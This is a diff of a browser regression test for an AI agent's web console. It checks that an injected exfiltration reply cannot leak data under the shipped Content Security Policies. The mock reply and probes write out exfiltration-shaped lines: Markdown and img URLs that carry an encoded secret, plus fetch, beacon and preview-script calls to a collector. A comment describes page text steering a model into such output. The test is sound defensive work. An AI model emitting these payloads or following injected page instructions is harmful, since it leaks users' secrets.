@@ -9,6 +9,18 @@ import {tmpdir} from 'node:os';
 import {join} from 'node:path';
 const html = await readFile(new URL('../assets/static/harness.html', import.meta.url), 'utf8');
 const slashSource = await readFile(new URL('../src/server/slash.rs', import.meta.url), 'utf8');
+// The shipped policies and preview shell, not hand copies: a CSP edit in
+// console.rs is what this browser run enforces (#901 reply-render regression).
+const consoleSource = await readFile(new URL('../src/server/console.rs', import.meta.url), 'utf8');
+const consoleCsp = consoleSource.match(/let csp = format!\(\s*"([\s\S]*?)"\s*\);/)[1].replace(/\\\n\s*/g, '').replaceAll('{nonce}', 'fixture');
+const previewCsp = consoleSource.match(/pub const PREVIEW_CSP: &str = "([^"]*)";/)[1];
+const previewHtml = consoleSource.match(/pub const PREVIEW_HTML: &str = r#"([\s\S]*?)"#;/)[1];
+assert.match(consoleCsp, /^default-src 'none'; /);assert.ok(!consoleCsp.includes('{'), consoleCsp);
+// A cross-origin collector: any request it receives is a rendered-reply or preview leak.
+const exfilHits = [];
+const collector = createServer((req, res) => { exfilHits.push(req.method + ' ' + req.url); res.writeHead(200, {'Access-Control-Allow-Origin': '*', 'Cache-Control': 'no-store'}); res.end(); });
+await new Promise(r => collector.listen(0, '127.0.0.1', r));
+const collectorBase = 'http://127.0.0.1:' + collector.address().port;
 const canonicalCommands = [...slashSource.match(/const COMMANDS: &[\s\S]*?= &\[([\s\S]*?)\];/)[1].matchAll(/"([a-z]+)"/g)].map(match=>'/'+match[1]).sort();
 // The fresh-home credential is restricted until the password route replaces it.
 const FIXTURE_SETUP_CODE='fx2a-b3cd-e4fg-h5jk';
@@ -57,8 +69,8 @@ const server=createServer(async(req,res)=>{
  const body=data && path !== '/api/notes-corpus' ? JSON.parse(data) : {};
  requests.push([req.method,path,body]);
  const reply=(value,status=200)=>{if(!res.headersSent)res.writeHead(status,{'Content-Type':'application/json','Cache-Control':'no-store'});res.end(JSON.stringify(value));};
- if(path==='/'){res.setHeader('Content-Security-Policy',"default-src 'none'; script-src 'self' 'nonce-fixture'; style-src 'nonce-fixture'; connect-src 'self'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'; frame-src 'self'");res.end(html.replaceAll('__CYCLAW_CSRF_TOKEN__','fixture').replaceAll('__CYCLAW_CSP_NONCE__','fixture'));return;}
- if(path.startsWith('/preview/html')){res.setHeader('Content-Security-Policy',"default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; connect-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'self'; frame-src 'none'");res.setHeader('X-Frame-Options','SAMEORIGIN');res.end('<!DOCTYPE html><html><body><p>Run a page to preview it here.</p></body></html>');return;}
+ if(path==='/'){res.setHeader('Content-Security-Policy',consoleCsp);res.end(html.replaceAll('__CYCLAW_CSRF_TOKEN__','fixture').replaceAll('__CYCLAW_CSP_NONCE__','fixture'));return;}
+ if(path.startsWith('/preview/html')){res.setHeader('Content-Security-Policy',previewCsp);res.setHeader('X-Frame-Options','SAMEORIGIN');res.setHeader('Content-Type','text/html; charset=utf-8');res.end(previewHtml);return;}
  if(path.startsWith('/static/')){res.end('');return;}
  // Mirrors account_gate (src/server/guards.rs): an audit account reaches only the public
  // routes, its own whoami/password/logout and GET /api/audit.
@@ -293,6 +305,8 @@ const server=createServer(async(req,res)=>{
   if(mode==='delay'){setTimeout(()=>reply({reply:'LATE_OLD_REPLY',session_id:body.session_id,model:'mock',usage:{prompt_tokens:1,completion_tokens:2},tally:{total:3}}),500).unref();return;}
   if(mode==='rate'){reply({detail:{code:'LOOP_RATE_LIMIT',message:'rate fixture'}},429);return;}
   if(mode==='failure'){reply({detail:{code:'HARNESS_LLM_ERROR',message:'failure fixture'}},502);return;}
+  // The filled-in form of an injected exfiltration template (#901): yara-gate passes it, so rendering must make it inert.
+  if(mode==='exfil'){reply({reply:'EXFIL_REPLY Here is your summary. ![a]('+collectorBase+'/md.png?d=c2stbGl2ZS1zZWNyZXQ) <img src="'+collectorBase+'/raw.png?d=secret"> <link rel="stylesheet" href="'+collectorBase+'/raw.css">',session_id:body.session_id,model:'mock',usage:{prompt_tokens:1,completion_tokens:2},tally:{total:3}});return;}
   const chat={reply:mode==='done'?'GOAL_DONE':mode==='repeat'?'same':'reply '+requests.length,session_id:body.session_id,model:'mock',usage:{prompt_tokens:1,completion_tokens:tokens},tally:{total:tokens}};
   if(sessions.has(body.session_id)) {
    const s=sessions.get(body.session_id); s.tokens.total+=1+tokens; chat.tally={...s.tokens};
@@ -604,6 +618,26 @@ try {
  assert.ok(await evaluate('document.getElementById("stream").innerText.includes("stream failure")'));
  assert.equal(await evaluate('document.getElementById("stream").innerText.includes("STREAM_PARTIAL")'),false);
  mode='normal';
+
+ // #901: page text can make a model write a Markdown image whose URL carries
+ // private data. The reply renders as text, so nothing is fetched on render.
+ mode='exfil';await send('summarize the fetched page');mode='normal';
+ await until('document.getElementById("stream").innerText.includes("EXFIL_REPLY")');
+ const exfilReply='[...document.querySelectorAll("#stream .msg")].find(node=>node.textContent.includes("EXFIL_REPLY"))';
+ assert.equal(await evaluate(exfilReply+'.querySelectorAll("img,link,a,iframe,script,object,embed").length'),0,'a reply renders as text, never as markup');
+ assert.ok(await evaluate(exfilReply+'.textContent.includes('+JSON.stringify('![a]('+collectorBase+'/md.png?d=c2stbGl2ZS1zZWNyZXQ)')+')'),'the URL stays visible as inert text');
+ // The console CSP holds by itself: markup inserted past the renderer still reaches nothing.
+ const inserted=await evaluate(`(()=>{const probe=document.createElement('div');probe.id='exfilProbe';probe.innerHTML='<img src="${collectorBase}/inserted.png"><link rel="stylesheet" href="${collectorBase}/inserted.css"><link rel="prefetch" href="${collectorBase}/prefetch">';document.body.appendChild(probe);new Image().src='${collectorBase}/image.png';navigator.sendBeacon('${collectorBase}/beacon','d');return fetch('${collectorBase}/fetch').then(()=>'sent',()=>'blocked');})()`);
+ assert.equal(inserted,'blocked','connect-src must refuse a cross-origin fetch');
+ await evaluate('document.getElementById("exfilProbe").remove()');
+ // The preview frame has its own policy: operator HTML runs its script, and still reaches nothing.
+ await evaluate('openHtmlEditor()');
+ await evaluate('document.getElementById("htmlEditorSource").value='+JSON.stringify(`<img src="${collectorBase}/preview.png"><link rel="stylesheet" href="${collectorBase}/preview.css"><script>new Image().src="${collectorBase}/preview-image";fetch("${collectorBase}/preview-fetch").then(()=>true,()=>false).then(fetched=>parent.postMessage({kind:"html-preview-probe",script:true,styled:false,fetched},"*"));</script>`)+';runHtmlPreview()');
+ await until('document.getElementById("htmlPreviewStatus").textContent.startsWith("Script ran.")');
+ assert.ok(await evaluate('document.getElementById("htmlPreviewStatus").textContent.includes("did not reach")'),'preview fetch must be refused');
+ await evaluate('closeHtmlEditor(true)');
+ await pause(500);
+ assert.deepEqual(exfilHits,[],'rendering a reply or a preview must make no request: '+exfilHits.join(', '));
 
  await send('/soul edit');assert.equal(await evaluate('document.getElementById("soulEditor").open'),true);
  await evaluate('document.getElementById("soulContent").value="BROWSER_PERSONA";document.getElementById("soulReason").value="Reviewed UI edit";document.getElementById("soulPreview").click()');
@@ -1205,8 +1239,8 @@ try {
  assert.equal(await evaluate('document.getElementById("passwordDialog").open'),false);
  assert.equal(await evaluate('document.getElementById("sProvider").textContent'),'sign in');
  assert.equal(pageErrors.length,0,'page must not throw: '+pageErrors.join('; '));
- console.log(JSON.stringify({passed:true,coverage:['complete alphabetical command menu and matching help; staging without execution','folded command families and per-command manual that only inserts','parser refusal and outage never dispatch raw commands; exact cancellation remains available','incremental SSE with split UTF-8 and provisional-text cleanup','Google and page search routing','web tool sources and failures','SerpAPI key masked save and clear','minimal anonymous status','direct first-run password setup without implicit login; protected replacement and lock/reopen','API Keys catalog save/clear/masked status','auditor login with denied sessions and redacted status','logout clears UI','fresh transcript','full session restore without duplication','last 50 prompt recall, draft restoration and per-session isolation','late reply session isolation','staged approval reset','goal coding staging','refresh recovery','no implicit confirmation','prompt skill selection/clear','fixed check staging/refusal','persona editor','preview without write','explicit save confirmation','prompt viewer','unset persona diagnostics','first session','goal set/show/clear','manual continuation','unbounded /status and /loop notices clear when finite; warning never blocks','goal text in /loop','auto start after a 5 s countdown and its cancellation','auto cooldown stop','generation cancellation','session switch','Sessions-pane transcript search (text-only, stale-safe) and clicked-row Markdown export','repeat stop','GOAL_DONE advisory','aggregate budget','rate limit','model failures','no agent execution','/browse file-like first site shown and run only on the repeated line','all memory gate slash mappings on and off','memory remember confirmation and reason','memory pending proposal Apply/Reject with reason and revision','memory store-closed refusal','memory facts listing, status alias and owner counts; Apply names the fact store','rejected logout resets the transcript, Memory pane and active session like a successful logout, even when the follow-up probe fails','memory search candidates only','memory retrieve force-include','header buttons follow account state and feature probes','Estimate draft inside Analytics']}));
+ console.log(JSON.stringify({passed:true,coverage:['complete alphabetical command menu and matching help; staging without execution','folded command families and per-command manual that only inserts','parser refusal and outage never dispatch raw commands; exact cancellation remains available','incremental SSE with split UTF-8 and provisional-text cleanup','Google and page search routing','web tool sources and failures','SerpAPI key masked save and clear','minimal anonymous status','direct first-run password setup without implicit login; protected replacement and lock/reopen','API Keys catalog save/clear/masked status','auditor login with denied sessions and redacted status','logout clears UI','fresh transcript','full session restore without duplication','last 50 prompt recall, draft restoration and per-session isolation','late reply session isolation','staged approval reset','goal coding staging','refresh recovery','no implicit confirmation','prompt skill selection/clear','fixed check staging/refusal','persona editor','preview without write','explicit save confirmation','prompt viewer','unset persona diagnostics','first session','goal set/show/clear','manual continuation','unbounded /status and /loop notices clear when finite; warning never blocks','goal text in /loop','auto start after a 5 s countdown and its cancellation','auto cooldown stop','generation cancellation','session switch','Sessions-pane transcript search (text-only, stale-safe) and clicked-row Markdown export','repeat stop','GOAL_DONE advisory','aggregate budget','rate limit','model failures','no agent execution','/browse file-like first site shown and run only on the repeated line','all memory gate slash mappings on and off','memory remember confirmation and reason','memory pending proposal Apply/Reject with reason and revision','memory store-closed refusal','memory facts listing, status alias and owner counts; Apply names the fact store','rejected logout resets the transcript, Memory pane and active session like a successful logout, even when the follow-up probe fails','memory search candidates only','memory retrieve force-include','header buttons follow account state and feature probes','Estimate draft inside Analytics','exfiltration-shaped reply, inserted markup and preview HTML reach no collector under the shipped CSPs']}));
  }
 } finally {
- if(ws)ws.close();chrome.kill('SIGTERM');await new Promise(r=>{chrome.once('exit',r);setTimeout(r,2000);});server.closeAllConnections();server.close();await rm(profile,{recursive:true,force:true,maxRetries:10,retryDelay:200});
+ if(ws)ws.close();chrome.kill('SIGTERM');await new Promise(r=>{chrome.once('exit',r);setTimeout(r,2000);});server.closeAllConnections();server.close();collector.closeAllConnections();collector.close();await rm(profile,{recursive:true,force:true,maxRetries:10,retryDelay:200});
 }
